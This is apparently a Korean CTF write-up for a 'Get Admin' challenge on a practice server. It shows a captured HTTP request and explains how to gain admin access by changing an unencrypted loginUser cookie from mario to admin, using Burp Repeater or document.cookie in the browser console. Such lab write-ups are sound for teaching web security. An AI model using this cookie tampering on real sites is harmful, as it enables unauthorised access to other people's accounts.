# Get Admin

login 화면의 history
![1](https://user-images.githubusercontent.com/106296883/231322895-6eac2cc7-7690-4e0c-b71b-668c9d197044.PNG)

로그인
```
mario / mariosuper
```

로그인을 한 후에 HTTP History를 먼저 해석함.
![2](https://user-images.githubusercontent.com/106296883/231323751-4379a0dd-db07-4a2a-b5f9-791abdafa21b.PNG)

맨 위 history는 로그인 화면의 history이기 때문에 제외,   
4개의 history가 올라왔다.
```
POST 방식으로 입력을 해서 로그인을 하니까 
300번대 HTTP 상태 코드(리다이렉트)가 생겼다
어디론가 이동한다는 소리이다.
```
```
리다이렉트의 장소는 index.php이다.
그리고 mario에 해당하는 세션이 존재한다.
```
```
1  GET /2/index.php HTTP/1.1
2  Host: ctf.segfaulthub.com:1129
3  Cache-Control: max-age=0
4  Upgrade-Insecure-Requests: 1
5  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
6  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
7  Referer: http://ctf.segfaulthub.com:1129/2/login.php
8  Accept-Encoding: gzip, deflate
9  Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
10 Cookie: loginUser=mario; session=11c4528c-8337-48fa-9246-9ddd32197c42.rZh7cyBmgTH2VkmxZscx4v-nWEE; PHPSESSID=rvoudoqj1ficipdmigc8hj7bkb
11 Connection: close
```
![3](https://user-images.githubusercontent.com/106296883/231325032-e3ba60df-1b16-4fb0-8970-a220fd401448.PNG)

이때 Cookie를 주의해서 봐야 한다.   
일반적인 Cookie의 sessionID의 값들은 암호화가 된 상태로 cookie가 전송하지만,   
loginUser 이라는 데이터에는 암호화가 되지 않고 mario라는 user라는 것을 알아차릴 수 있는 정보를 포함하고 있다.   

그렇다면 이떄 loginUser의 값을 admin으로 바꿔본다면?

바꾸는 방법 1
```
index.php에 해당하는 history를 우클릭해서 "Send to Repeater" 클릭.
```
```
loginUser=mario; 를 
loginUser=admin; 으로 변경
```
```
Send 클릭
```
```
Response 에서 Render 를 통해 확인.
```
![4](https://user-images.githubusercontent.com/106296883/231325997-d2f13627-1bc1-43fb-ad38-ab37af3d699a.PNG)
</br>
</br>
</br>

바꾸는 방법 2
```
F12 눌러서 개발자 도구를 들어가서   
Console 창에서 cookie를 확인할 수 있는 명령어 입력.
```
```
document.cookie 입력

결과 : 'loginUser=mario; PHPSESSID=rvoudoqj1ficipdmigc8hj7bkb'
```
```
document.cookie = 'loginUser=admin;' 입력

결과 : 'loginUser=admin;'
```
```
document.cookie 입력해서 결과에 loginUser의 정보가 제대로 수정되었는지 확인 후
```
![5](https://user-images.githubusercontent.com/106296883/231326978-bc3a5b13-079d-435c-90f2-200ae48f44c4.PNG)
```
F5 새로고침
```
![6](https://user-images.githubusercontent.com/106296883/231327076-ff4ae134-f96f-40e2-9aa9-174aacda8290.PNG)
